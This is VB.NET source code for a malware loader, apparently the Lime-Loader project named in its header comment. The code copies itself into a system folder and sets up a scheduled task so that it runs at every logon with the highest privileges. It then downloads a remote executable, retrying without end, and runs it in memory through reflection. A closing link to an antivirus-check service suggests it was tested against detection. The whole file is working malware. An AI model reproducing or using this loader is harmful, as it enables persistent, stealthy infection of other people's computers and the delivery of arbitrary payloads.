'https://github.com/NYAN-x-CAT/Lime-Loader

Public Class Main

    Public Shared Sub Main()
        Install("26", "Loader.exe")
        Invoke("http://127.0.0.1:80/Payload.exe")
        'Invoke(My.Resources.Payload) -> need algorithm
    End Sub

    Public Shared Sub Install(ByVal Path As String, ByVal Name As String)
        On Error Resume Next
        If Application.ExecutablePath <> IO.Path.Combine(Environment.GetFolderPath(Path), Name) Then
            IO.File.Copy(Application.ExecutablePath, IO.Path.Combine(Environment.GetFolderPath(Path), Name), True)
            Shell("schtasks /create /f /sc onlogon /RL highest /tn " + IO.Path.GetFileName(Application.ExecutablePath) + " /tr " + """'" + IO.Path.Combine(Environment.GetFolderPath(Path), Name) + "'""")
        End If
    End Sub

    Public Shared Sub Invoke(ByVal URL As String)
        Dim Load As Object = CallByName(AppDomain.CurrentDomain, "load", CallType.Method, Download(URL))
        Dim EntryPoint As Object = CallByName(Load, "EntryPoint", CallType.Get)
        Try
            Dim Invoke As Object = CallByName(EntryPoint, "Invoke", CallType.Method, Nothing, Nothing)
        Catch ex As Exception
            Dim Invoke As Object = CallByName(EntryPoint, "Invoke", CallType.Method, Nothing, New Object() {Nothing})
        End Try

    End Sub

    Public Shared Function Download(ByVal URL As String)
re:
        Dim EXE As Byte() = Nothing
        Try
            Dim WC As New Net.WebClient
            EXE = WC.DownloadData(URL)
            WC.Dispose()
        Catch ex As Exception
            Threading.Thread.Sleep(5000)
            GoTo re
        End Try
        Return EXE
    End Function

End Class

'http://avcheck.net/id/mTYMhMvaPa6c
